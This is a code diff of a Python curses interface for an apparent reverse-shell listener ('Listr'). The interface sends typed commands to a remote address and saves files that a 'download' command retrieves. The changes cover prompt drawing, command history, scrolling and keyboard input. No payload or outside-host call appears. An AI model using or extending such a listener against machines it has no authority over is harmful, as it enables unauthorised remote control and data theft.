@@ -7,10 +7,7 @@ import socket
 import json
 import base64
 import curses
-# import numpy as np
-import time
-# import subprocess
-# import keyboard
+# import time
 
 class Listr:
 
@@ -77,11 +74,9 @@ class Listr:
 
     def run(self, cole):
         #curses.nocbreak()
-        row = 1
-        scrl_row = 0
         buff_ch = ""
+        str_to__ = ""
         buff_com = ['']
-        hist = ''
         (coley, colex) = cole.getmaxyx()
         cli_p = curses.newpad(self.cli_pad_y, colex - 3)
         cli_p.scrollok(True)
@@ -89,54 +84,51 @@ class Listr:
         cli_p.keypad(True)
         cli_p.border()
         try:
+            cli_p.clear()
+            cli_p.addstr(self.cli_pad_y - coley, cli_p.getyx()[1], str(self.addrs) + "$ ")
+
             while True:
-                # Checking if the size of the windows changed
-                (coley_c, colex_c) = cole.getmaxyx()
-                if coley_c != coley or colex_c != colex:
-                    (coley, colex) = (coley_c, colex_c)
-                    cli_p.addstr(0,0,"testing... rezising")
-                    cli_p.resize(self.cli_pad_y, colex - 3)
-                    cole.clear()
-                    cole.refresh()
-                
-                cli_p.clear()
 
-                # cli_p.addstr(0,0,"testing... scrl_row: " + str(scrl_row) + \
-                #     "cursor: " + str(cli_p.getyx()))
-
-                cli_p.addstr(1, 1, hist)
-                cli_p.addstr(row, 1, str(self.addrs) + "$ " + buff_ch)
-                
-                cli_p.refresh(scrl_row, 0, 0, 0, coley - 1, colex - 3)
+                cli_p.refresh(self.cli_pad_y - coley, 0, 0, 0, coley - 1, colex - 3)
 
                 #Capturing the input
                 # The main 'enter' key retrieve 10, whereas the another 'enter' key 343 which
                 # is the value that's working. (??)
-                inp_ch = (lambda input: curses.KEY_ENTER if input == 10 else input)(cli_p.getch())
+                inp_ch = (lambda input: curses.KEY_ENTER if input == 10 or input == '\n' else input)(cli_p.get_wch())
+                
+                # Checking if the size of the windows changed
+                (coley_c, colex_c) = cole.getmaxyx()
+                if coley_c != coley or colex_c != colex:
+                    (coley, colex) = (coley_c, colex_c)
+                    cli_p.addstr("testing... rezising")
+                    cli_p.resize(self.cli_pad_y, colex - 3)
+                    cole.clear()
+                    cole.refresh()
 
                 # Handling the scroll
-                if inp_ch == curses.KEY_UP or inp_ch == curses.KEY_DOWN:
-                    self.app_k__(cli_p, scrl_row, inp_ch, coley, colex)
-                    print("out")
+                elif inp_ch == curses.KEY_UP or inp_ch == curses.KEY_DOWN:
+                    self.app_k__(cli_p, self.cli_pad_y - coley, inp_ch, coley, colex)
 
                 # Handlig history and executing
                 elif inp_ch == curses.KEY_ENTER:
                     # Managing the output history
                     buff_com[:0] = [buff_ch] # buff_com is the history commands, which will be scrolled.
-                    hist += str(self.addrs) + "$ " + buff_ch + "\n"
-                    hist += self.s_comm__(buff_ch) + "\n"
-                    if cli_p.getyx()[0] + 1 < cli_p.getmaxyx()[0]:
-                        row = cli_p.getyx()[0] + 1
+                    str_to__ = '\n' + self.s_comm__(buff_ch).replace('\r', '') + '\n' + str(self.addrs) + "$ "
 
                     buff_ch = ''
 
-                    if row + 1 > coley - 1 and row < cli_p.getmaxyx()[0] - 1: 
-                        scrl_row += 1
-
                 elif inp_ch == curses.KEY_BACKSPACE:
+                    if buff_ch != '':
+                        cli_p.delch(cli_p.getyx()[0], cli_p.getyx()[1] - 1)
                     buff_ch = buff_ch[:-1]
-                elif inp_ch < 127 and inp_ch > 31:
-                    buff_ch = buff_ch + chr(inp_ch)
+                elif type(inp_ch) is str and len(inp_ch) == 1:
+                    if ord(inp_ch) < 127 and ord(inp_ch) > 31:
+                        buff_ch += inp_ch
+                        str_to__ = inp_ch
+                
+                cli_p.addstr(cli_p.getyx()[0], cli_p.getyx()[1], str_to__)
+                str_to__ = ''
+                
         except curses.error as cur_err:
             print(cur_err)
 
@@ -153,7 +145,6 @@ class Listr:
                 result = self.exe_rmy(self.comm)
             if self.comm[0] == "download" and "[Bad command]" not in result:
                 result = self.w_f(self.comm[1], result.encode())
-            print(f"\n{result}\n")
             if "exit" in comm:
                 self.send_data("test...")
             return result
